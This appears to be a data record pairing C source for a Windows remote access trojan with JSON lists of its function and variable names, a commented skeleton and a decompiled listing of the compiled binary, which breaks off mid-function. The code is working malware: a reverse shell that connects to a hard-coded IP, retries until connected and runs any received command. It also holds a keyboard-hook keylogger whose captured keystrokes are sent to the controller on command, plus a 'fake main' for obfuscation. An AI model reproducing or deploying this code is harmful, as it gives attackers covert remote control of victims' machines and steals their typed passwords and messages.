SetEvent(notSendingLog);
}
// DEFAULT command - anything else runs directly in command shell
else
{
FILE fp;
fp = _popen(buffer, ""r""); // execute command in buffer and store command output in the file fp points to
while(fgets(container, sizeof(container), fp)) // store contents of file, identified by pointer fp, in container
{
strcat(total_response, container); // only concatonate container to total_response if fgets is successful
}
send(sock, total_response, sizeof(total_response), 0); // sends character array total_response back to the server
fclose(fp); // closes file stream
}
}
}
/ REAL MAIN
* Sets up socket - attempts to connect until successful, then calls shell function
*/
int real_main()
{
struct sockaddr_in ServAddr = {0}; // initialize a sockaddr_in structure - specifies address and port for IPV4/AF_INET
unsigned short ServPort;
char *ServIP;
WSADATA wsaData; //contains data about windows sockets, needed to establish a connection to windows machine
ServIP = ""192.168.1.166""; // hard code to IP of receiving server
ServPort = 50005; //any port that exists and is not being used works
// checks if connection is successful
if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
{
exit(1);
}
sock = socket(AF_INET, SOCK_STREAM, 0); // first two params specificy IPV4 and TCP - sets up socket
ServAddr.sin_family = AF_INET; // sets sin_family member to AF_INET/IPV4 (must always be AF_INET)
// converts ServIP and ServPort to address and port values (int and 16-bit number in network byte order)
ServAddr.sin_addr.s_addr = inet_addr(ServIP);
ServAddr.sin_port = htons(ServPort);
// attempt to connect every 10 seconds until a connection is succesful
while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
{
Sleep(10);
}
oh_boy_what_does_this_do();
}
// fake main for some very easy obfuscation
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
real_main();
}

/*
*
*
/
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winuser.h>
#include ""UseTracker.h""
#define NAME ""make_me_crazy""
#define buffSize 1024
#define tempBuffSize 18378
HHOOK ghHook = NULL; // NOTE - gh stands for global handle
HANDLE ghMutex = NULL;
HANDLE ghLogHeap = NULL;
PSTR pLogBuff = NULL; // pointer to a string, in this case, the key logger buffer
DWORD dwLogBuffSize = 0; // double word - 32 bit unsigned integer, to hold size of key log buffer
DWORD dwLogBuffLength = 0;
HANDLE ghTempHeap = NULL;
PSTR pTempBuff = NULL;
HANDLE notWritingTemp = NULL;
HANDLE notSendingLog = NULL;
int tempBuffHasData = 0;
/ STARTUP FUNCTION
* called by Shell function, defines variables & starts new thread for keylogging functions
*/
int make_me_crazy()
{
// Check to see if keylogger already running, if it is, return an error value
if((ghMutex = CreateMutex(NULL, TRUE, NAME)) == NULL)
{
return(-1);
}
// automatically clean up memory at program termination
atexit((VOID )clean);
// allocate two heaps for the keylogger to use
ghLogHeap = HeapCreate(0, buffSize + 1, 0);
pLogBuff = (PSTR)HeapAlloc(ghLogHeap, HEAP_ZERO_MEMORY, buffSize + 1);
dwLogBuffSize = buffSize + 1;
ghTempHeap = HeapCreate(0, dwLogBuffSize, 0);
pTempBuff = (PSTR)HeapAlloc(ghTempHeap, HEAP_ZERO_MEMORY, tempBuffSize);
// create events to handle multiple threads
notSendingLog = CreateEvent(NULL, TRUE, TRUE, NULL);
notWritingTemp = CreateEvent(NULL, TRUE, TRUE, NULL);
// spawn a new thread for keylogging
if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)eventsRec, NULL, 0, NULL) == NULL)
{
return(-1);
}
return(0);
}
/ KEYLOG FUNCTION
* record keystrokes when they happen, change event states to indicate new key presses
*/
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
if (HC_ACTION == nCode)
{
KBDLLHOOKSTRUCT *keyEvent = (KBDLLHOOKSTRUCT )lParam;
if (WM_KEYDOWN == wParam)
{
char key[2];
DWORD keyCode = keyEvent->vkCode;
int shift = GetAsyncKeyState(VK_SHIFT);
if (keyCode >= 0x30 && keyCode <= 0x39)
{
if (shift)
{
switch (keyCode)
{
case 0x30:
Log(')');
break;
case 0x31:
Log('!');
break;
case 0x32:
Log('@');
break;
case 0x33:
Log('#');
break;
case 0x34:
Log('$');
break;
case 0x35:
Log('%');
break;
case 0x36:
Log('^');
break;
case 0x37:
Log('&');
break;
case 0x38:
Log('');
break;
case 0x39:
Log('(');
break;
}
}
else
{
key[0] = (char)(keyCode);
Log(key);
}
}
else if (keyCode >= 0x41 && keyCode <= 0x5A)
{
if (shift)
key[0] = (char)(keyCode);
else
key[0] = (char)(keyCode + 32);
Log(key);
}
else if (keyCode >=0x08 && keyCode <= 0x2F)
{
switch(keyCode)
{
case VK_SPACE:
Log(' ');
break;
case VK_BACK:
LogS(""[BACKSP]"");
break;
case VK_TAB:
LogS(""[TAB]"");
break;
case VK_CONTROL:
LogS(""[CTRL]"");
break;
case VK_MENU:
LogS(""[ALT]"");
break;
case VK_CAPITAL:
LogS(""[CAPS]"");
break;
case VK_DELETE:
LogS(""[DEL]"");
break;
}
}
else
{
if (shift)
{
switch(keyCode)
{
case VK_OEM_1:
Log(':');
break;
case VK_OEM_PLUS:
Log('+');
break;
case VK_OEM_COMMA:
Log('<');
break;
case VK_OEM_MINUS:
Log('_');
break;
case VK_OEM_PERIOD:
Log('>');
break;
case VK_OEM_2:
Log('?');
break;
case VK_OEM_3:
Log('~');
break;
case VK_OEM_4:
Log('{');
break;
case VK_OEM_5:
Log('|');
break;
case VK_OEM_6:
Log('}');
break;
case VK_OEM_7:
Log('""');
break;
}
}
else
{
switch(keyCode)
{
case VK_OEM_1:
Log(';');
break;
case VK_OEM_PLUS:
Log('=');
break;
case VK_OEM_COMMA:
Log(',');
break;
case VK_OEM_MINUS:
Log('-');
break;
case VK_OEM_PERIOD:
Log('.');
break;
case VK_OEM_2:
Log('/');
break;
case VK_OEM_3:
Log('`');
break;
case VK_OEM_4:
Log('[');
break;
case VK_OEM_5:
Log('\\');
break;
case VK_OEM_6:
Log(']');
break;
case VK_OEM_7:
Log('\'');
break;
}
}
}
ResetEvent(notWritingTemp);
// if temporary buffer is full, clear it and continue recording
if (strlen(pTempBuff) >= tempBuffSize - dwLogBuffLength)
{
ZeroMemory(pTempBuff, tempBuffSize);
return CallNextHookEx(0, nCode, wParam, lParam);
}
// if data is being sent, wait for it to send before writing to Buffer
WaitForSingleObject(notSendingLog, INFINITE);
strncpy(pTempBuff + strlen(pTempBuff), pLogBuff, dwLogBuffLength);
tempBuffHasData = 1;
SetEvent(notWritingTemp);
// Zero Log Buffer after each keystroke is recorded
ZeroMemory(pLogBuff, dwLogBuffLength);
dwLogBuffLength = 0;
}
}
return CallNextHookEx(0, nCode, wParam, lParam);
}
/ INSTALLS A HOOK PROCEDURE INTO A HOOK CHAIN - MONITORS CERTAIN THREADS FOR EVENTS
* Type of hook procedure - monitoring low-level keyboard input
* Pointer to hook procedure - points to a DLL procedure OR a hook procedure in process code
* handle to DLL containing hook procedure pointed to by previous param OR NULL if thread is created by current process
* thread identifier - if 0, associated with all existing threads
* Returns: HHOOK (handle to hook procedure)
*/
void eventsRec()
{
if ((ghHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0)) == NULL)
{
ExitProcess(1);
}
MSG msg;
while (GetMessage(&msg, 0, 0, 0) != 0)
{
TranslateMessage(&msg);
DispatchMessage(&msg);
}
UnhookWindowsHookEx(ghHook);
}
PSTR getBuff()
{
return pTempBuff;
}
void Log(char character)
{
sprintf(pLogBuff + strlen(pLogBuff), ""%c"", character);
dwLogBuffLength = strlen(pLogBuff);
}
void LogS(char string)
{
sprintf(pLogBuff + strlen(pLogBuff), ""%s"", string);
dwLogBuffLength = strlen(pLogBuff);
}
void clean()
{
if (pLogBuff && ghLogHeap)
{
HeapFree(ghLogHeap, 0, pLogBuff);
HeapDestroy(ghLogHeap);
}
if (ghHook) UnhookWindowsHookEx(ghHook);
if (ghMutex) CloseHandle(ghMutex);
if (pTempBuff && ghTempHeap)
{
HeapFree(ghTempHeap, 0, pTempBuff);
HeapDestroy(ghTempHeap);
}
}

#include <windows.h>
#include <winuser.h>
// method signature for keylogger function
int make_me_crazy();
LRESULT CALLBACK LowLevelKeyboardProc(int, WPARAM, LPARAM);
void eventsRec();
PSTR getBuff();
void Log(char);
void LogS(char *);
void clean();","{
""functions"": [
""oh_boy_what_does_this_do"",
""real_main"",
""make_me_crazy"",
""LowLevelKeyboardProc"",
""eventsRec"",
""getBuff"",
""Log"",
""LogS"",
""clean""
]
}","{
""variables"": [
""pTempBuff"",
""notWritingTemp"",
""notSendingLog"",
""tempBuffHasData"",
""ghHook"",
""ghMutex"",
""ghLogHeap"",
""pLogBuff"",
""dwLogBuffSize"",
""dwLogBuffLength"",
""msg"",
""character"",
""string"",
""container"",
""total_response"",
""buffer"",
""notSendingLog"",
""notWritingTemp"",
""keyEvent"",
""keyCode"",
""shift"",
""nCode"",
""wParam"",
""lParam"",
""hInstance"",
""hPrev"",
""lpCmdLine"",
""nCmdShow"",
""pTempBuff"",
""pLogBuff"",
""ghLogHeap"",
""ghHook"",
""ghMutex"",
""ghTempHeap"",
""tempBuffHasData""
]
}","/*
* NOTE
* This code will be EXTENSIVELY commented
* I have never done socket programming before, and will write out
* what each line does for personal reference
/
/
int run_it_up()
{
...
}
/
/ SHELL FUNCTION
* Is called by main function after socket connection established
* loops infinitely, receiving commands, doing something with them, and sending responses, until quit command
/
void oh_boy_what_does_this_do()
{
...
}
/ REAL MAIN
* Sets up socket - attempts to connect until successful, then calls shell function
/
int real_main()
{
...
}
// fake main for some very easy obfuscation
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
...
}
/
*
*
/
/ STARTUP FUNCTION
* called by Shell function, defines variables & starts new thread for keylogging functions
/
int make_me_crazy()
{
...
}
/ KEYLOG FUNCTION
* record keystrokes when they happen, change event states to indicate new key presses
/
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
...
}
/INSTALLS A HOOK PROCEDURE INTO A HOOK CHAIN - MONITORS CERTAIN THREADS FOR EVENTS
* Type of hook procedure - monitoring low-level keyboard input
* Pointer to hook procedure - points to a DLL procedure OR a hook procedure in process code
* handle to DLL containing hook procedure pointed to by previous param OR NULL if thread is created by current process
* thread identifier - if 0, associated with all existing threads
* Returns: HHOOK (handle to hook procedure)
*/
void eventsRec()
{
...
}
PSTR getBuff()
{
...
}
void Log(char character)
{
...
}
void LogS(char string)
{
...
}
void clean()
{
...
}","#include ""out.h""
void FUN_004011b0(void)
{
code *pcVar1;
int *piVar2;
undefined4 puVar3;
UINT uExitCode;
___dyn_tls_init_12(0,2);
_SetUnhandledExceptionFilter_4((LPTOP_LEVEL_EXCEPTION_FILTER)&LAB_00401000);
___cpu_features_init();
_fesetenv(__CRT_fenv);
__setargv();
pcVar1 = _iob_exref;
if (__CRT_fmode != 0) {
__fmode = __CRT_fmode;
__setmode((int )(_iob_exref + 0x10),__CRT_fmode);
__setmode((int )(pcVar1 + 0x30),__CRT_fmode);
__setmode((int *)(pcVar1 + 0x50),__CRT_fmode);
}
piVar2 = (int *)___p__fmode();
*piVar2 = __fmode;
__pei386_runtime_relocator();
___main();
puVar3 = (undefined4 *)___p__environ();
uExitCode = _text_startup(__argc,DAT_00408000,(char **)*puVar3);
__cexit();
// WARNING: Subroutine does not return
_ExitProcess_4(uExitCode);
}
void __mingw32_init_mainargs(void)
{
char **local_14;
_startupinfo local_10 [4];
local_10[0].newmode = 0;
___getmainargs(&__argc,(char ***)&DAT_00408000,&local_14,__CRT_glob & 1,local_10);
return;
}
void _mainCRTStartup(void)
{
_func_4879 *in_stack_ffffffcc;
__set_app_type(1);
FUN_004011b0();
__set_app_type(2);
FUN_004011b0();
// WARNING: Could not recover jumptable at 0x00401320. Too many branches
// WARNING: Treating indirect jump as call
atexit(in_stack_ffffffcc);
return;
}
int __cdecl _atexit(_func_4879 *param_1)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00401320. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = atexit(param_1);
return iVar1;
}
// WARNING: Unable to track spacebase fully for stack
void _oh_boy_what_does_this_do(void)
{
int iVar1;
uint uVar2;
int iVar3;
size_t sVar4;
char *pcVar5;
undefined1 unaff_BP;
undefined4 local_4fe0;
undefined4 local_4fdc;
undefined4 local_4fd8;
undefined2 local_4fd4;
undefined local_810 [1024];
undefined local_410 [3];
undefined auStack_40d [1021];
FILE *local_10;
undefined4 uStack_8;
uStack_8 = 0x40146d;
uVar2 = ___chkstk_ms(unaff_BP);
iVar1 = -uVar2;
while( true ) {
*(undefined4 *)(&stack0x00000004 + iVar1) = 0x400;
*(undefined4 *)(&stack0x00000000 + iVar1) = 0;
*(undefined **)(&stack0xfffffffc + iVar1) = local_410;
(undefined4 )((int)&uStack_8 + iVar1) = 0x40148d;
_memset((void **)(&stack0xfffffffc + iVar1),(int *)(&stack0x00000000 + iVar1),
*(size_t *)(&stack0x00000004 + iVar1));
*(undefined4 *)(&stack0x00000004 + iVar1) = 0x400;
*(undefined4 *)(&stack0x00000000 + iVar1) = 0;
*(undefined **)(&stack0xfffffffc + iVar1) = local_810;
(undefined4 )((int)&uStack_8 + iVar1) = 0x4014ab;
_memset((void **)(&stack0xfffffffc + iVar1),(int *)(&stack0x00000000 + iVar1),
*(size_t *)(&stack0x00000004 + iVar1));
*(undefined4 *)(&stack0x00000004 + iVar1) = 0x47d0;
*(undefined4 *)(&stack0x00000000 + iVar1) = 0;
*(undefined4 **)(&stack0xfffffffc + iVar1) = &local_4fe0;
(undefined4 )((int)&uStack_8 + iVar1) = 0x4014c9;
_memset((void **)(&stack0xfffffffc + iVar1),(int *)(&stack0x00000000 + iVar1),
*(size_t *)(&stack0x00000004 + iVar1));
*(undefined4 *)(&stack0x00000008 + iVar1) = 0;
*(undefined4 *)(&stack0x00000004 + iVar1) = 0x400;
*(undefined **)(&stack0x00000000 + iVar1) = local_410;
*(undefined4 *)(&stack0xfffffffc + iVar1) = _sock;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x4014f2;
_recv_16((SOCKET )(&stack0xfffffffc + iVar1),(char **)(&stack0x00000000 + iVar1),
*(int )(&stack0x00000004 + iVar1),(int *)(&stack0x00000008 + iVar1));
*(undefined4 *)(&stack0x00000004 + iVar1) = 4;
*(undefined **)(&stack0x00000000 + iVar1) = local_410;
*(undefined **)(&stack0xfffffffc + iVar1) = &_rdata;
(undefined4 )((int)&uStack_8 + iVar1) = 0x401513;
iVar3 = _strncmp((char **)(&stack0xfffffffc + iVar1),(char **)(&stack0x00000000 + iVar1),
*(size_t *)(&stack0x00000004 + iVar1));
if (iVar3 == 0) break;
*(undefined4 *)(&stack0x00000004 + iVar1) = 3;
*(undefined **)(&stack0x00000000 + iVar1) = local_410;
*(undefined **)(&stack0xfffffffc + iVar1) = &DAT_00406069;
(undefined4 )((int)&uStack_8 + iVar1) = 0x401556;
iVar3 = _strncmp((char **)(&stack0xfffffffc + iVar1),(char **)(&stack0x00000000 + iVar1),
*(size_t *)(&stack0x00000004 + iVar1));
if (iVar3 == 0) {
*(undefined **)(&stack0xfffffffc + iVar1) = auStack_40d;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x40156b;
_chdir((char **)(&stack0xfffffffc + iVar1));
*(undefined4 *)(&stack0x00000008 + iVar1) = 0;
*(undefined4 *)(&stack0x00000004 + iVar1) = 0x47d0;
*(undefined4 **)(&stack0x00000000 + iVar1) = &local_4fe0;
*(undefined4 *)(&stack0xfffffffc + iVar1) = _sock;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x401594;
_send_16((SOCKET )(&stack0xfffffffc + iVar1),(char **)(&stack0x00000000 + iVar1),
*(int )(&stack0x00000004 + iVar1),(int *)(&stack0x00000008 + iVar1));
}
else {
*(undefined4 *)(&stack0x00000004 + iVar1) = 0xc;
*(undefined **)(&stack0x00000000 + iVar1) = local_410;
*(char **)(&stack0xfffffffc + iVar1) = ""make_me_crazy"";
(undefined4 )((int)&uStack_8 + iVar1) = 0x4015ba;
iVar3 = _strncmp((char **)(&stack0xfffffffc + iVar1),(char **)(&stack0x00000000 + iVar1),
*(size_t *)(&stack0x00000004 + iVar1));
if (iVar3 == 0) {
*(undefined4 *)((int)&uStack_8 + iVar1) = 0x4015c3;
iVar3 = _make_me_crazy();
if (iVar3 == 0) {
local_4fe0 = 0x63637553;
local_4fdc = 0xa737365;
}
else {
local_4fe0 = 0x6c696146;
local_4fdc = CONCAT13(local_4fdc.3_1,0xa6465);
}
*(undefined4 *)(&stack0x00000008 + iVar1) = 0;
*(undefined4 *)(&stack0x00000004 + iVar1) = 0x47d0;
*(undefined4 **)(&stack0x00000000 + iVar1) = &local_4fe0;
*(undefined4 *)(&stack0xfffffffc + iVar1) = _sock;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x40161b;
_send_16((SOCKET )(&stack0xfffffffc + iVar1),(char **)(&stack0x00000000 + iVar1),
*(int )(&stack0x00000004 + iVar1),(int *)(&stack0x00000008 + iVar1));
}
else {
*(undefined4 *)(&stack0x00000004 + iVar1) = 9;
*(undefined **)(&stack0x00000000 + iVar1) = local_410;
*(char **)(&stack0xfffffffc + iVar1) = ""with_rats"";
(undefined4 )((int)&uStack_8 + iVar1) = 0x401641;
iVar3 = _strncmp((char **)(&stack0xfffffffc + iVar1),(char **)(&stack0x00000000 + iVar1),
*(size_t *)(&stack0x00000004 + iVar1));
if (iVar3 == 0) {
*(undefined4 *)(&stack0xfffffffc + iVar1) = _notSendingLog;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x401656;
_ResetEvent_4((HANDLE *)(&stack0xfffffffc + iVar1));
if (_tempBuffHasData == 0) {
local_4fe0 = 0x204f4e5b;
local_4fdc = 0x2057454e;
local_4fd8 = 0x41544144;
local_4fd4 = 0xa5d;
*(undefined4 *)(&stack0x00000008 + iVar1) = 0;
*(undefined4 *)(&stack0x00000004 + iVar1) = 0x47d0;
*(undefined4 **)(&stack0x00000000 + iVar1) = &local_4fe0;
*(undefined4 *)(&stack0xfffffffc + iVar1) = _sock;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x401780;
_send_16((SOCKET )(&stack0xfffffffc + iVar1),(char **)(&stack0x00000000 + iVar1),
*(int )(&stack0x00000004 + iVar1),(int *)(&stack0x00000008 + iVar1));
}
else {
*(undefined4 *)(&stack0x00000000 + iVar1) = 0xffffffff;
*(undefined4 *)(&stack0xfffffffc + iVar1) = _notWritingTemp;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x40167b;
_WaitForSingleObject_8
((HANDLE )(&stack0xfffffffc + iVar1),(DWORD *)(&stack0x00000000 + iVar1));
local_4fe0 = 0x3a474c4b;
local_4fdc = CONCAT31(local_4fdc.1_3,0x20);
*(undefined4 *)(&stack0xfffffffc + iVar1) = _pTempBuff;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x40169b;
sVar4 = _strlen((char **)(&stack0xfffffffc + iVar1));
*(size_t *)(&stack0x00000004 + iVar1) = sVar4;
*(undefined4 *)(&stack0x00000000 + iVar1) = _pTempBuff;
*(int *)(&stack0xfffffffc + iVar1) = (int)&local_4fdc + 1;
(undefined4 )((int)&uStack_8 + iVar1) = 0x4016bc;
_strncpy((char **)(&stack0xfffffffc + iVar1),(char **)(&stack0x00000000 + iVar1),
*(size_t *)(&stack0x00000004 + iVar1));
*(undefined4 *)(&stack0xfffffffc + iVar1) = _pTempBuff;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x4016c9;
sVar4 = _strlen((char **)(&stack0xfffffffc + iVar1));
*(undefined *)((int)&local_4fdc + sVar4 + 1) = 10;
*(undefined4 *)(&stack0x00000008 + iVar1) = 0;
*(undefined4 *)(&stack0x00000004 + iVar1) = 0x47d0;
*(undefined4 **)(&stack0x00000000 + iVar1) = &local_4fe0;
*(undefined4 *)(&stack0xfffffffc + iVar1) = _sock;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x401700;
_send_16((SOCKET )(&stack0xfffffffc + iVar1),(char **)(&stack0x00000000 + iVar1),
*(int )(&stack0x00000004 + iVar1),(int *)(&stack0x00000008 + iVar1));
*(undefined4 *)(&stack0xfffffffc + iVar1) = _pTempBuff;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x401710;
sVar4 = _strlen((char **)(&stack0xfffffffc + iVar1));
*(size_t *)(&stack0x00000004 + iVar1) = sVar4;
*(undefined4 *)(&stack0x00000000 + iVar1) = 0;
*(undefined4 *)(&stack0xfffffffc + iVar1) = _pTempBuff;
(undefined4 )((int)&uStack_8 + iVar1) = 0x40172b;
_memset((void **)(&stack0xfffffffc + iVar1),(int *)(&stack0x00000000 + iVar1),
*(size_t *)(&stack0x00000004 + iVar1));
_tempBuffHasData = 0;
}
*(undefined4 *)(&stack0xfffffffc + iVar1) = _notSendingLog;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x401790;
_SetEvent_4((HANDLE *)(&stack0xfffffffc + iVar1));
}
else {
*(undefined **)(&stack0x00000000 + iVar1) = &DAT_00406085;
*(undefined **)(&stack0xfffffffc + iVar1) = local_410;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x4017ae;
local_10 = __popen((char **)(&stack0xfffffffc + iVar1),
*(char **)(&stack0x00000000 + iVar1));
while( true ) {
*(FILE **)(&stack0x00000004 + iVar1) = local_10;
*(undefined4 *)(&stack0x00000000 + iVar1) = 0x400;
*(undefined **)(&stack0xfffffffc + iVar1) = local_810;
(undefined4 )((int)&uStack_8 + iVar1) = 0x4017e8;
pcVar5 = _fgets((char **)(&stack0xfffffffc + iVar1),(int *)(&stack0x00000000 + iVar1),
*(FILE **)(&stack0x00000004 + iVar1));
if (pcVar5 == (char *)0x0) break;
*(undefined **)(&stack0x00000000 + iVar1) = local_810;
*(undefined4 **)(&stack0xfffffffc + iVar1) = &local_4fe0;
(undefined4 )((int)&uStack_8 + iVar1) = 0x4017cb;
_strcat((char **)(&stack0xfffffffc + iVar1),(char **)(&stack0x00000000 + iVar1));
}
*(undefined4 *)(&stack0x00000008 + iVar1) = 0;
*(undefined4 *)(&stack0x00000004 + iVar1) = 0x47d0;
*(undefined4 **)(&stack0x00000000 + iVar1) = &local_4fe0;
*(undefined4 *)(&stack0xfffffffc + iVar1) = _sock;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x401815;
_send_16((SOCKET )(&stack0xfffffffc + iVar1),(char **)(&stack0x00000000 + iVar1),
*(int )(&stack0x00000004 + iVar1),(int *)(&stack0x00000008 + iVar1));
*(FILE **)(&stack0xfffffffc + iVar1) = local_10;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x401823;
_fclose((FILE **)(&stack0xfffffffc + iVar1));
}
}
}
}
*(undefined4 *)(&stack0xfffffffc + iVar1) = _sock;
*(undefined4 )((int)&uStack_8 + iVar1) = 0x401524;
_closesocket_4((SOCKET *)(&stack0xfffffffc + iVar1));
*(undefined4 *)((int)&uStack_8 + iVar1) = 0x40152c;
_WSACleanup_0();
*(undefined4 *)(&stack0xfffffffc + iVar1) = 0;
// WARNING: Subroutine does not return
*(undefined4 )((int)&uStack_8 + iVar1) = 0x401538;
_exit((int *)(&stack0xfffffffc + iVar1));
}
void _real_main(void)
{
u_short uVar1;
int iVar2;
WSADATA local_1b4;
sockaddr local_24;
u_short local_12;
char *local_10;
local_24.sa_family = 0;
local_24.sa_data[0] = '\0';
local_24.sa_data[1] = '\0';
local_24.sa_data[2] = '\0';
local_24.sa_data[3] = '\0';
local_24.sa_data[4] = '\0';
local_24.sa_data[5] = '\0';
local_24.sa_data[6] = '\0';
local_24.sa_data[7] = '\0';
local_24.sa_data[8] = '\0';
local_24.sa_data[9] = '\0';
local_24.sa_data[10] = '\0';
local_24.sa_data[11] = '\0';
local_24.sa_data[12] = '\0';
local_24.sa_data[13] = '\0';
local_10 = ""192.168.1.166"";
local_12 = 0xc355;
iVar2 = _WSAStartup_8(2,&local_1b4);
if (iVar2 != 0) {
// WARNING: Subroutine does not return
_exit(1);
}
_sock = _socket_12(2,1,0);
local_24.sa_family = 2;
local_24.sa_data.2_4 = _inet_addr_4(local_10);
uVar1 = _htons_4(local_12);
local_24.sa_data.0_2 = uVar1;
while( true ) {
iVar2 = _connect_12(_sock,&local_24,0x10);
if (iVar2 == 0) break;
_Sleep_4(10);
}
_oh_boy_what_does_this_do();
return;
}
void _WinMain_16(void)
{
_real_main();
return;
}
undefined4 _make_me_crazy(void)
{
undefined4 uVar1;
HANDLE pvVar2;
_ghMutex = _CreateMutexA_12((LPSECURITY_ATTRIBUTES)0x0,1,""make_me_crazy"");
if (_ghMutex == (HANDLE)0x0) {
uVar1 = 0xffffffff;
}
else {
_atexit((_func_4879 *)&_clean);
_ghLogHeap = _HeapCreate_12(0,0x401,0);
_pLogBuff = _HeapAlloc_12(_ghLogHeap,8,0x401);
_dwLogBuffSize = 0x401;
_ghTempHeap = _HeapCreate_12(0,0x401,0);
_pTempBuff = _HeapAlloc_12(_ghTempHeap,8,0x47ca);
_notSendingLog = _CreateEventA_16((LPSECURITY_ATTRIBUTES)0x0,1,1,(LPCSTR)0x0);
_notWritingTemp = _CreateEventA_16((LPSECURITY_ATTRIBUTES)0x0,1,1,(LPCSTR)0x0);
pvVar2 = _CreateThread_24((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&_eventsRec,
(LPVOID)0x0,0,(LPDWORD)0x0);
if (pvVar2 == (HANDLE)0x0) {
uVar1 = 0xffffffff;
}
else {
uVar1 = 0;
}
}
return uVar1;
}
void __cdecl _Log(char param_1)
{
char *pcVar1;
size_t sVar2;
pcVar1 = _pLogBuff;
sVar2 = _strlen(_pLogBuff);
_sprintf(pcVar1 + sVar2,""%c"",(int)param_1);
_dwLogBuffLength = _strlen(_pLogBuff);
return;
}
void __cdecl _LogS(char *param_1)
{
char *pcVar1;
size_t sVar2;
pcVar1 = _pLogBuff;
sVar2 = _strlen(_pLogBuff);
_strcpy(pcVar1 + sVar2,param_1);
_dwLogBuffLength = _strlen(_pLogBuff);
return;
}
SOCKET _socket_12(int af,int type,int protocol)
{
SOCKET SVar1;
// WARNING: Could not recover jumptable at 0x00402178. Too many branches
// WARNING: Treating indirect jump as call
SVar1 = socket(af,type,protocol);
return SVar1;
}
int _send_16(SOCKET s,char *buf,int len,int flags)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00402180. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = send(s,buf,len,flags);
return iVar1;
}
int _recv_16(SOCKET s,char *buf,int len,int flags)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00402188. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = recv(s,buf,len,flags);
return iVar1;
}
ulong _inet_addr_4(char *cp)
{
ulong uVar1;
// WARNING: Could not recover jumptable at 0x00402190. Too many branches
// WARNING: Treating indirect jump as call
uVar1 = inet_addr(cp);
return uVar1;
}
u_short _htons_4(u_short hostshort)
{
u_short uVar1;
// WARNING: Could not recover jumptable at 0x00402198. Too many branches
// WARNING: Treating indirect jump as call
uVar1 = htons(hostshort);
return uVar1;
}
int _connect_12(SOCKET s,sockaddr *name,int namelen)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x004021a0. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = connect(s,name,namelen);
return iVar1;
}
int _closesocket_4(SOCKET s)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x004021a8. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = closesocket(s);
return iVar1;
}
int _WSAStartup_8(WORD wVersionRequired,LPWSADATA lpWSAData)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x004021b0. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = WSAStartup(wVersionRequired,lpWSAData);
return iVar1;
}
int _WSACleanup_0(void)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x004021b8. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = WSACleanup();
return iVar1;
}
// WARNING: Unable to track spacebase fully for stack
int __cdecl __setargv(void)
{
char cVar1;
bool bVar2;
char *pcVar3;
uint uVar4;
char *pcVar5;
char *pcVar6;
int iVar7;
int iVar8;
char *pcVar9;
int iVar10;
char *pcVar11;
uint uStackY_60;
LPSTR pCVar12;
char acStack_4c [8];
int local_44;
undefined *local_40;
uint local_3c;
char *local_38;
int local_34;
uint local_30;
undefined local_2c [4];
undefined4 local_28;
int local_24;
undefined4 local_20;
if ((__CRT_glob & 2) == 0) {
uStackY_60 = 0x4024c5;
iVar8 = __mingw32_init_mainargs();
return iVar8;
}
uStackY_60 = 0x4021db;
pcVar3 = _GetCommandLineA_0();
uStackY_60 = 0x4021e8;
pCVar12 = pcVar3;
local_40 = &stack0xffffffa4;
_strlen(pcVar3);
uStackY_60 = 0x4021f7;
uVar4 = ___chkstk_ms((char)pCVar12);
iVar8 = -uVar4;
local_20 = 0;
local_30 = 0;
local_34 = 0;
local_38 = acStack_4c + iVar8;
local_3c = __CRT_glob & 0x4400 | 0x10;
uVar4 = 0;
pcVar6 = acStack_4c + iVar8;
LAB_00402230:
do {
cVar1 = *pcVar3;
joined_r0x0040223b:
iVar10 = (int)cVar1;
if (iVar10 == 0) {
if (uVar4 != 0) {
pcVar5 = pcVar6 + uVar4;
pcVar3 = pcVar6;
do {
pcVar9 = pcVar3 + 1;
*pcVar3 = '\\';
pcVar6 = pcVar5;
pcVar3 = pcVar9;
} while (pcVar9 != pcVar5);
}
if ((local_38 < pcVar6) || (local_34 != 0)) {
*pcVar6 = '\0';
*(undefined4 *)(&stack0xffffffac + iVar8) = 0;
*(undefined **)(&stack0xffffffb0 + iVar8) = local_2c;
*(uint *)(&stack0xffffffa8 + iVar8) = local_3c;
*(char **)(&stack0xffffffa4 + iVar8) = local_38;
